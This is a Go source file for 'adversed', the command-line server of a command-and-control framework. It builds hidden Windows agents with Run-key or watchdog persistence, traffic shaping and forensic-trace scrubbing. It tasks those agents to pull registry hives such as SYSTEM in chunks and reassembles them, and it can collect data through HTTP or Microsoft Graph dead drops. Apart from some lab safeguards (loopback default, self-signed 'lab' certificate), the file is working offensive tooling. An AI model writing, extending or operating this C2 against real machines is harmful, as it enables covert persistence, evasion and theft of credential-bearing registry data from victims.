// Command adversed is the ADVERSE C2 server CLI.
//
// Subcommands:
//
//	gen-agent  - generate an agent configuration file
//	gen-stub   - cross-compile a self-contained Windows agent with embedded config
//	serve      - start the C2 server (TLS, agent wire + operator admin API)
//	task       - enqueue a task via the admin API
//	tasks      - show task lifecycle for an agent
//	list       - list registered agents and their status
//	results    - show stored results / fetch reassembled hives
//	kill       - enqueue a signed kill via the admin API
//	status     - server health
//	version    - print version
//
// Operator commands authenticate with a bearer token (--token-file,
// ADVERSE_OPERATOR_TOKEN). The fleet secret is taken from --secret-file or
// ADVERSE_SECRET; passing it on argv is supported but visible to `ps`.
package main

import (
	"bytes"
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"flag"
	"fmt"
	"log/slog"
	"math/big"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"github.com/ashwnn/adverse-go/internal/adminapi"
	"github.com/ashwnn/adverse-go/internal/cryptokeys"
	"github.com/ashwnn/adverse-go/internal/drop"
	"github.com/ashwnn/adverse-go/internal/profile"
	"github.com/ashwnn/adverse-go/internal/server"
	"github.com/ashwnn/adverse-go/internal/transport"
)

var (
	version   = "0.2.0"
	buildTime = "unknown"
	gitCommit = "unknown"
)

const defaultServerURL = "https://127.0.0.1:8443"

func main() {
	if len(os.Args) < 2 {
		usage()
		os.Exit(2)
	}
	cmd := os.Args[1]
	switch cmd {
	case "gen-agent":
		cmdGenAgent(os.Args[2:])
	case "gen-stub":
		cmdGenStub(os.Args[2:])
	case "serve":
		cmdServe(os.Args[2:])
	case "task":
		cmdTask(os.Args[2:])
	case "tasks":
		cmdTasks(os.Args[2:])
	case "list":
		cmdList(os.Args[2:])
	case "results":
		cmdResults(os.Args[2:])
	case "kill":
		cmdKill(os.Args[2:])
	case "status":
		cmdStatus(os.Args[2:])
	case "version":
		fmt.Printf("adversed %s (commit %s, built %s)\n", version, gitCommit, buildTime)
	default:
		usage()
		os.Exit(2)
	}
}

func usage() {
	fmt.Fprintf(os.Stderr, "adversed - ADVERSE C2 server\n\n")
	fmt.Fprintf(os.Stderr, "Usage: adversed <command> [options]\n\n")
	fmt.Fprintf(os.Stderr, "Commands:\n")
	fmt.Fprintf(os.Stderr, "  gen-agent  Generate an agent configuration file\n")
	fmt.Fprintf(os.Stderr, "  gen-stub   Cross-compile a self-contained Windows agent (embedded config)\n")
	fmt.Fprintf(os.Stderr, "  serve      Start the C2 server (agent wire + operator admin API)\n")
	fmt.Fprintf(os.Stderr, "  task       Enqueue a task for an agent (admin API)\n")
	fmt.Fprintf(os.Stderr, "  tasks      Show task lifecycle (admin API)\n")
	fmt.Fprintf(os.Stderr, "  list       List agents and status (admin API)\n")
	fmt.Fprintf(os.Stderr, "  results    Show results / fetch reassembled hives (admin API)\n")
	fmt.Fprintf(os.Stderr, "  kill       Enqueue a signed kill (admin API)\n")
	fmt.Fprintf(os.Stderr, "  status     Server health (admin API)\n")
	fmt.Fprintf(os.Stderr, "  version    Print version\n")
	fmt.Fprintf(os.Stderr, "\nGenerate options (gen-agent and gen-stub):\n")
	fmt.Fprintf(os.Stderr, "  --persistence <mode>    none|watchdog|runkey|both (default watchdog)\n")
	fmt.Fprintf(os.Stderr, "  --run-key-name <name>   Run value name (default: runtime default)\n")
	fmt.Fprintf(os.Stderr, "  --spool[=false]         encrypted on-disk result spool (default true)\n")
	fmt.Fprintf(os.Stderr, "  --spool-dir <path>      spool directory (default: runtime default)\n")
	fmt.Fprintf(os.Stderr, "  --shape[=false]         upload traffic shaping (default true)\n")
	fmt.Fprintf(os.Stderr, "  --upload-jitter-ms <n>  extra upload jitter in ms, >= 0 (default 250)\n")
	fmt.Fprintf(os.Stderr, "  --scrub-traces          scrub forensic traces (default false)\n")
	fmt.Fprintf(os.Stderr, "  --exit-after-delivery[=false]  exit after result delivery (gen-stub default true, gen-agent false)\n")
	fmt.Fprintf(os.Stderr, "\ngen-stub only:\n")
	fmt.Fprintf(os.Stderr, "  --windowsgui            -H windowsgui inside -ldflags; strips the console (default true)\n")
	fmt.Fprintf(os.Stderr, "\nRun 'adversed <command> --help' for the full flag list.\n")
}

// ---- shared operator auth helpers ----

// operatorToken resolves the operator token: --token-file > --token >
// ADVERSE_OPERATOR_TOKEN.
func operatorToken(fs *flag.FlagSet) string {
	if t := fs.Lookup("token-file").Value.String(); t != "" {
		raw, err := os.ReadFile(t)
		if err == nil {
			return strings.TrimSpace(string(raw))
		}
		slog.Warn("token-file unreadable", "path", t, "err", err)
	}
	if t := fs.Lookup("token").Value.String(); t != "" {
		return t
	}
	return os.Getenv("ADVERSE_OPERATOR_TOKEN")
}

func addOperatorFlags(fs *flag.FlagSet) {
	fs.String("server", defaultServerURL, "C2 server URL")
	fs.String("token", "", "operator token (prefer --token-file)")
	fs.String("token-file", "", "operator token file (0600, preferred)")
	fs.Bool("insecure", true, "accept self-signed lab TLS certificate")
}

func newAdminClient(fs *flag.FlagSet) *adminapi.Client {
	serverURL := fs.Lookup("server").Value.String()
	token := operatorToken(fs)
	if token == "" {
		slog.Warn("no operator token provided (set --token-file or ADVERSE_OPERATOR_TOKEN)")
	}
	if fs.Lookup("insecure").Value.String() == "true" {
		return adminapi.NewInsecureClient(serverURL, token)
	}
	return adminapi.NewClient(serverURL, token)
}

// ---- gen-agent ----

func cmdGenAgent(args []string) {
	fs := flag.NewFlagSet("gen-agent", flag.ExitOnError)
	secret := fs.String("secret", "", "pre-shared secret hex (empty to generate)")
	out := fs.String("out", "agent.json", "output file path")
	serverURL := fs.String("server-url", defaultServerURL, "C2 server URL")
	cfgFlags := addAgentConfigFlags(fs, false)
	fs.Parse(args)

	if err := cfgFlags.validate(); err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		fs.Usage()
		os.Exit(2)
	}

	sec := *secret
	if sec == "" {
		var err error
		sec, err = cryptokeys.Keygen()
		if err != nil {
			slog.Error("keygen failed", "err", err)
			os.Exit(1)
		}
	}

	opts := defaultAgentConfigOptions()
	opts.Secret = sec
	opts.ServerURL = *serverURL
	cfgFlags.apply(&opts)

	cfgJSON, agentID, err := buildAgentConfigJSON(opts)
	if err != nil {
		slog.Error("agent config build failed", "err", err)
		os.Exit(1)
	}
	var raw bytes.Buffer
	if err := json.Indent(&raw, cfgJSON, "", "  "); err != nil {
		slog.Error("marshal failed", "err", err)
		os.Exit(1)
	}
	if err := os.WriteFile(*out, raw.Bytes(), 0600); err != nil {
		slog.Error("write failed", "err", err)
		os.Exit(1)
	}
	fmt.Printf("wrote %s (agent %s)\n", *out, agentID)
}

// ---- serve ----

// resolveSecret determines the fleet secret: --secret-file > ADVERSE_SECRET >
// --secret. Passwords on argv are supported but visible to process listings.
func resolveSecret(fs *flag.FlagSet) string {
	if f := fs.Lookup("secret-file").Value.String(); f != "" {
		raw, err := os.ReadFile(f)
		if err != nil {
			slog.Error("secret-file unreadable", "path", f, "err", err)
			os.Exit(1)
		}
		return strings.TrimSpace(string(raw))
	}
	if s := os.Getenv("ADVERSE_SECRET"); s != "" {
		return strings.TrimSpace(s)
	}
	return fs.Lookup("secret").Value.String()
}

func cmdServe(args []string) {
	fs := flag.NewFlagSet("serve", flag.ExitOnError)
	_ = fs.String("secret", "", "pre-shared secret hex (prefer --secret-file or ADVERSE_SECRET)")
	secretFile := fs.String("secret-file", "", "file containing the pre-shared secret hex")
	listen := fs.String("listen", "127.0.0.1:8443", "listen address")
	profilePath := fs.String("profile", "", "profile JSON path")
	stateDir := fs.String("state-dir", "", "state directory (overrides profile)")
	bindAll := fs.Bool("bind-all", false, "bind to non-loopback (requires explicit flag)")
	operatorToken := fs.String("operator-token", "", "operator API token (prefer --operator-token-file)")
	operatorTokenFile := fs.String("operator-token-file", "", "operator API token file (0600, preferred)")
	fs.Parse(args)

	sec := resolveSecret(fs)
	if sec == "" {
		fmt.Fprintln(os.Stderr, "error: fleet secret is required (--secret-file, ADVERSE_SECRET, or --secret)")
		fs.Usage()
		os.Exit(2)
	}
	if *secretFile == "" && fs.Lookup("secret").Value.String() != "" {
		slog.Warn("fleet secret passed on argv; visible in process listings - use --secret-file")
	}

	token := *operatorToken
	if *operatorTokenFile != "" {
		raw, err := os.ReadFile(*operatorTokenFile)
		if err != nil {
			slog.Error("operator-token-file unreadable", "path", *operatorTokenFile, "err", err)
			os.Exit(1)
		}
		token = strings.TrimSpace(string(raw))
	} else if token == "" {
		token = os.Getenv("ADVERSE_OPERATOR_TOKEN")
	}
	if token == "" {
		slog.Warn("no operator token configured: admin API disabled (fail closed). Set --operator-token-file or ADVERSE_OPERATOR_TOKEN.")
	}

	prof, err := profile.Load(*profilePath)
	if err != nil {
		slog.Error("profile load failed", "err", err)
		os.Exit(1)
	}
	if *stateDir != "" {
		prof.StateDir = *stateDir
	}
	if *listen != "" {
		prof.Listen = *listen
	}

	// Loopback by default: binding to non-loopback requires --bind-all.
	if !*bindAll && prof.Listen != "" && !strings.HasPrefix(prof.Listen, "127.0.0.1") && !strings.HasPrefix(prof.Listen, "localhost") && !strings.HasPrefix(prof.Listen, "::1") {
		slog.Warn("non-loopback listen requires --bind-all flag")
		os.Exit(2)
	}

	srv, err := server.New(sec, slog.Default())
	if err != nil {
		slog.Error("server creation failed", "err", err)
		os.Exit(1)
	}
	srv.SetStateDir(prof.StateDir)
	srv.BeaconIntervalS = prof.BeaconIntervalS
	srv.BeaconJitterS = prof.BeaconJitterS
	srv.MaxResultsPerAgent = prof.MaxResultsPerAgent
	srv.SetResponseHeaders(prof.Headers)

	if prof.StateDir != "" {
		if err := os.MkdirAll(prof.StateDir, 0700); err != nil {
			slog.Error("state dir creation failed", "err", err)
			os.Exit(1)
		}
		if err := srv.LoadState(); err != nil {
			slog.Warn("state load failed (starting fresh)", "err", err)
		}
	}

	agentHandler := transport.NewHandler(srv, slog.Default())
	adminHandler := transport.NewAdminHandler(srv, slog.Default(), token, version)
	root := transport.Mux(agentHandler, adminHandler)

	// Dead-drop collector: poll the configured store for agent request blobs.
	// Uses the same wire core as the HTTP handler (ProcessFrame).
	var dropPoller *drop.Poller
	if prof.Drop.Enabled {
		store, err := dropStoreFromProfile(prof.Drop)
		if err != nil {
			slog.Error("drop store config failed", "err", err)
			os.Exit(1)
		}
		dropPoller = drop.NewPoller(store, prof.Drop.Dir, agentHandler, slog.Default())
		dropPoller.PollInterval = time.Duration(prof.Drop.PollIntervalS) * time.Second
		slog.Info("dead-drop collector enabled", "store", prof.Drop.Store, "dir", prof.Drop.Dir)
	}

	certPEM, keyPEM, err := generateSelfSignedCert()
	if err != nil {
		slog.Error("TLS cert generation failed", "err", err)
		os.Exit(1)
	}
	tlsCert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		slog.Error("TLS keypair failed", "err", err)
		os.Exit(1)
	}
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{tlsCert},
		MinVersion:   tls.VersionTLS12,
	}

	httpSrv := &http.Server{
		Addr:              prof.Listen,
		Handler:           root,
		TLSConfig:         tlsConfig,
		ReadHeaderTimeout: 10 * time.Second,
		ReadTimeout:       30 * time.Second,
		WriteTimeout:      30 * time.Second,
		IdleTimeout:       60 * time.Second,
		MaxHeaderBytes:    16 << 10,
	}

	// Legacy drop-file ingestion poller (2s) for manual cross-process tasking.
	stopPoller := make(chan struct{})
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				srv.PollDropFiles()
			case <-stopPoller:
				return
			}
		}
	}()

	// Dead-drop collector goroutine.
	if dropPoller != nil {
		go dropPoller.Run(context.Background())
	}

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		slog.Info("shutting down...")
		close(stopPoller)
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		_ = httpSrv.Shutdown(ctx)
	}()

	srv.Audit("serve.start", map[string]any{
		"listen": prof.Listen, "state_dir": prof.StateDir, "version": version,
	})
	slog.Info("adversed online", "listen", prof.Listen, "profile", prof.Name)
	if err := httpSrv.ListenAndServeTLS("", ""); err != nil && err != http.ErrServerClosed {
		slog.Error("server error", "err", err)
		os.Exit(1)
	}
	srv.Audit("serve.stop", map[string]any{"reason": "signal"})
	slog.Info("adversed shut down gracefully")
}

// ---- task ----

func cmdTask(args []string) {
	fs := flag.NewFlagSet("task", flag.ExitOnError)
	addOperatorFlags(fs)
	agentID := fs.String("agent", "", "agent ID (required)")
	action := fs.String("action", "", "action: extract|noop|sleep (required)")
	hives := fs.String("hives", "SYSTEM", "comma-separated hive list (for extract)")
	jobID := fs.String("job-id", "", "job ID (auto-generated if empty)")
	chunkSize := fs.Int("chunk-size", 131072, "chunk size for extract")
	seconds := fs.Int("seconds", 30, "seconds to sleep (for sleep)")
	wait := fs.Bool("wait", false, "wait until the task reaches a terminal state")
	timeout := fs.Duration("timeout", 10*time.Minute, "max wait time with --wait")
	fs.Parse(args)

	if *agentID == "" || *action == "" {
		fmt.Fprintln(os.Stderr, "error: --agent and --action are required")
		fs.Usage()
		os.Exit(2)
	}

	client := newAdminClient(fs)
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	taskID, err := client.EnqueueTask(ctx, adminapi.EnqueueTaskRequest{
		AgentID:   *agentID,
		Action:    *action,
		Hives:     splitCSV(*hives),
		JobID:     *jobID,
		ChunkSize: *chunkSize,
		Seconds:   *seconds,
	})
	if err != nil {
		slog.Error("enqueue failed", "err", err)
		os.Exit(1)
	}
	fmt.Printf("queued %s (task %s) for %s\n", *action, taskID, *agentID)

	if *wait {
		if err := waitForTerminal(client, *agentID, taskID, *timeout); err != nil {
			slog.Error("wait failed", "err", err)
			os.Exit(1)
		}
	}
}

func waitForTerminal(c *adminapi.Client, agentID, taskID string, timeout time.Duration) error {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		tasks, err := c.Tasks(context.Background(), agentID)
		if err != nil {
			return err
		}
		for _, t := range tasks {
			if t.ID != taskID {
				continue
			}
			switch t.State {
			case "completed":
				fmt.Printf("task %s completed\n", taskID)
				return nil
			case "failed":
				return fmt.Errorf("task %s failed: %s", taskID, t.Error)
			case "expired":
				return fmt.Errorf("task %s expired: %s", taskID, t.Error)
			}
			fmt.Printf("task %s state=%s retries=%d\n", taskID, t.State, t.Retries)
			break
		}
		time.Sleep(2 * time.Second)
	}
	return fmt.Errorf("timed out waiting for task %s", taskID)
}

// ---- tasks ----

func cmdTasks(args []string) {
	fs := flag.NewFlagSet("tasks", flag.ExitOnError)
	addOperatorFlags(fs)
	agentID := fs.String("agent", "", "filter by agent ID")
	asJSON := fs.Bool("json", false, "emit JSON")
	fs.Parse(args)

	client := newAdminClient(fs)
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	tasks, err := client.Tasks(ctx, *agentID)
	if err != nil {
		slog.Error("list tasks failed", "err", err)
		os.Exit(1)
	}
	if *asJSON {
		raw, _ := json.MarshalIndent(tasks, "", "  ")
		fmt.Println(string(raw))
		return
	}
	if len(tasks) == 0 {
		fmt.Println("no tasks")
		return
	}
	fmt.Printf("%-24s %-10s %-8s %-4s %-6s %s\n", "TASK", "AGENT", "ACTION", "RET", "STATE", "AGE")
	for _, t := range tasks {
		age := "now"
		if created, err := time.Parse(time.RFC3339Nano, t.CreatedAt); err == nil {
			age = time.Since(created).Round(time.Second).String()
		}
		errTxt := ""
		if t.Error != "" {
			errTxt = " err=" + t.Error
		}
		fmt.Printf("%-24s %-10s %-8s %-4d %-6s %s%s\n", t.ID, t.AgentID, t.Action, t.Retries, t.State, age, errTxt)
	}
}

// ---- list ----

func cmdList(args []string) {
	fs := flag.NewFlagSet("list", flag.ExitOnError)
	addOperatorFlags(fs)
	fs.Parse(args)

	client := newAdminClient(fs)
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	agents, err := client.Agents(ctx)
	if err != nil {
		slog.Error("list agents failed", "err", err)
		os.Exit(1)
	}
	if len(agents) == 0 {
		fmt.Println("no agents registered")
		return
	}
	fmt.Printf("%-10s %-7s %-10s %-8s %s\n", "AGENT", "ONLINE", "KILL_EPOCH", "PENDING", "LAST_SEEN")
	for _, a := range agents {
		seen := "never"
		if a.LastSeen > 0 {
			seen = time.Unix(int64(a.LastSeen), 0).UTC().Format("2006-01-02 15:04:05")
		}
		fmt.Printf("%-10s %-7v %-10d %-8d %s\n", a.AgentID, a.Online, a.KillEpoch, a.PendingTasks, seen)
	}
}

// ---- results ----

func cmdResults(args []string) {
	fs := flag.NewFlagSet("results", flag.ExitOnError)
	addOperatorFlags(fs)
	agentID := fs.String("agent", "", "agent ID (required)")
	taskID := fs.String("task", "", "filter by task ID")
	rawOut := fs.String("out", "", "write reassembled hives to <out>/<task>-<hive>.bin")
	asJSON := fs.Bool("json", false, "emit JSON")
	fs.Parse(args)

	if *agentID == "" {
		fmt.Fprintln(os.Stderr, "error: --agent is required")
		fs.Usage()
		os.Exit(2)
	}
	if *rawOut != "" && *taskID == "" {
		fmt.Fprintln(os.Stderr, "error: --out requires --task (reassembly is per task)")
		fs.Usage()
		os.Exit(2)
	}

	client := newAdminClient(fs)
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	reassembled := *rawOut != ""
	resp, err := client.Results(ctx, *agentID, *taskID, reassembled)
	if err != nil {
		slog.Error("results failed", "err", err)
		os.Exit(1)
	}

	if *asJSON {
		raw, _ := json.MarshalIndent(resp, "", "  ")
		fmt.Println(string(raw))
		return
	}

	if len(resp.Results) == 0 {
		fmt.Printf("no results for %s\n", *agentID)
	} else {
		for _, res := range resp.Results {
			out := res.Payload
			if len(out) > 160 {
				out = out[:160] + "..."
			}
			fmt.Printf("[%s] payload=%s\n", res.TaskID, out)
		}
	}

	if reassembled {
		switch {
		case len(resp.Reassembled) == 0 && resp.Complete:
			fmt.Println("no reassembled data (empty job)")
		case len(resp.Reassembled) == 0:
			fmt.Println("job not yet complete - reassembly in progress")
		default:
			if err := os.MkdirAll(*rawOut, 0700); err != nil {
				slog.Error("mkdir failed", "dir", *rawOut, "err", err)
				os.Exit(1)
			}
			for hive, b64 := range resp.Reassembled {
				data, err := base64.StdEncoding.DecodeString(b64)
				if err != nil {
					slog.Error("decode reassembled bytes failed", "hive", hive, "err", err)
					continue
				}
				safe := strings.NewReplacer("\\", "_", "/", "_", ":", "_").Replace(hive)
				path := filepath.Join(*rawOut, fmt.Sprintf("%s-%s.bin", sanitizeFilePart(*taskID), safe))
				if err := os.WriteFile(path, data, 0600); err != nil {
					slog.Error("write reassembled hive failed", "path", path, "err", err)
					continue
				}
				fmt.Printf("wrote %s (%d bytes)\n", path, len(data))
			}
		}
	}
}

func sanitizeFilePart(s string) string {
	return strings.NewReplacer("/", "_", "\\", "_", ":", "_", ".", "_").Replace(s)
}

// ---- kill ----

func cmdKill(args []string) {
	fs := flag.NewFlagSet("kill", flag.ExitOnError)
	addOperatorFlags(fs)
	agentID := fs.String("agent", "", "agent ID (required)")
	payload := fs.String("payload", "kill", "kill payload (kill or kill_switch)")
	fs.Parse(args)

	if *agentID == "" {
		fmt.Fprintln(os.Stderr, "error: --agent is required")
		fs.Usage()
		os.Exit(2)
	}
	if err := validateKillPayload(*payload); err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		os.Exit(2)
	}

	client := newAdminClient(fs)
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Kill(ctx, adminapi.KillRequest{AgentID: *agentID, Payload: *payload})
	if err != nil {
		slog.Error("kill failed", "err", err)
		os.Exit(1)
	}
	fmt.Printf("queued %s for %s (task %s, epoch %d)\n", *payload, *agentID, resp.TaskID, resp.Epoch)
}

// validateKillPayload rejects kill payloads other than "kill" or "kill_switch".
func validateKillPayload(payload string) error {
	switch payload {
	case "kill", "kill_switch":
		return nil
	default:
		return fmt.Errorf("--payload must be \"kill\" or \"kill_switch\", got %q", payload)
	}
}

// ---- status ----

func cmdStatus(args []string) {
	fs := flag.NewFlagSet("status", flag.ExitOnError)
	addOperatorFlags(fs)
	fs.Parse(args)

	client := newAdminClient(fs)
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	h, err := client.Health(ctx)
	if err != nil {
		slog.Error("health check failed", "err", err)
		os.Exit(1)
	}
	fmt.Printf("status=%s version=%s uptime=%.0fs agents=%d online=%d queued_tasks=%d results=%d\n",
		h.Status, h.Version, h.UptimeSeconds, h.Agents, h.OnlineAgents, h.QueuedTasks, h.ResultsStored)
}

// ---- helpers ----

// dropStoreFromProfile builds the dead-drop store from the profile section.
func dropStoreFromProfile(dp profile.DropProfile) (drop.Store, error) {
	switch dp.Store {
	case "http":
		if dp.BaseURL == "" {
			return nil, fmt.Errorf("drop.base_url is required for store http")
		}
		hs := drop.NewHTTPStore(dp.BaseURL)
		hs.Username = dp.Auth.Username
		hs.Password = dp.Auth.Password
		hs.BearerEnv = dp.Auth.BearerEnv
		return hs, nil
	case "graph":
		if dp.TenantID == "" || dp.ClientID == "" || dp.UserUPN == "" {
			return nil, fmt.Errorf("drop requires tenant_id, client_id, user_upn for store graph")
		}
		if dp.ClientSecret == "" && dp.ClientSecretEnv == "" {
			return nil, fmt.Errorf("drop requires client_secret or client_secret_env for store graph")
		}
		gs := drop.NewGraphStore(dp.TenantID, dp.ClientID, dp.ClientSecret, dp.UserUPN)
		gs.ClientSecretEnv = dp.ClientSecretEnv
		return gs, nil
	default:
		return nil, fmt.Errorf("drop.store must be http or graph, got %q", dp.Store)
	}
}

func splitCSV(s string) []string {
	if s == "" {
		return nil
	}
	parts := strings.Split(s, ",")
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		if t := strings.TrimSpace(p); t != "" {
			out = append(out, t)
		}
	}
	return out
}

func generateSelfSignedCert() (certPEM, keyPEM []byte, err error) {
	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, nil, fmt.Errorf("generate key: %w", err)
	}
	template := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "adversed-lab-cert"},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(24 * time.Hour * 365),
		KeyUsage:     x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}
	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &priv.PublicKey, priv)
	if err != nil {
		return nil, nil, fmt.Errorf("create cert: %w", err)
	}
	certPEM = pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyDER, err := x509.MarshalECPrivateKey(priv)
	if err != nil {
		return nil, nil, fmt.Errorf("marshal key: %w", err)
	}
	keyPEM = pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
	return certPEM, keyPEM, nil
}
